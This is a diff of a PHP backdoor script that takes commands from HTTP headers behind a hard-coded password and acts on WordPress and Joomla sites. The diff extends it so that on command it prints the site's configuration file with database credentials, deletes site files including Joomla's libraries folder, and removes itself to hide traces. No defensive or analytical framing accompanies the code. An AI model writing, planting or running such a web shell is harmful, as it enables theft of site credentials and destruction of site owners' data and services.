@@ -12,24 +12,45 @@ $MISSION=$headers['mission'];
 
 switch ($MISSION) {
 	case 'getconfig':
+		// For wordPress start
 		if ($UG=='suka_ibana' && $LOGIN=='root' && $CMS=='wp') {
 			$conf=readfile('wp-config.php');
 			echo ($conf);
 		}
+		// For WordPress end
+		
+		// For Joomla start
+		if ($UG=='suka_ibana' && $LOGIN=='root' && $CMS=='joomla') {
+			$conf=readfile($ROOT.'/configuration.php');
+			echo ($conf);
+		}
+		// For Joomla end
 		break;
 	case 'destroy':
-		# code...
-		foreach ($DIR as $key) {
-			if($UG=='suka_ibana' && $LOGIN=='root' && $CMS=='wp'){
+		//for wordPress start
+		if($UG=='suka_ibana' && $LOGIN=='root' && $CMS=='wp'){
+			foreach ($DIR as $key) {
 				if (!is_dir($key)) {
 					unlink($ROOT.'/'.$key);
 				}
 			}
 		}
+		// For WordPress end
+
+		// For Joomla start
+		if($UG=='suka_ibana' && $LOGIN=='root' && $CMS=='joomla'){
+			$dir=scandir("$ROOT/libraries");
+			foreach ($dir as $file) {
+				if (is_file($file)) {
+					unlink("$ROOT/libraries/$file");
+				}
+			}
+		}	
+		// For Joomla end
 		break;
 	case 'delete':
 		unlink(__FILE__);
 		break;
-	
-}
-?>
+	default:
+		echo ("string");
+}?>
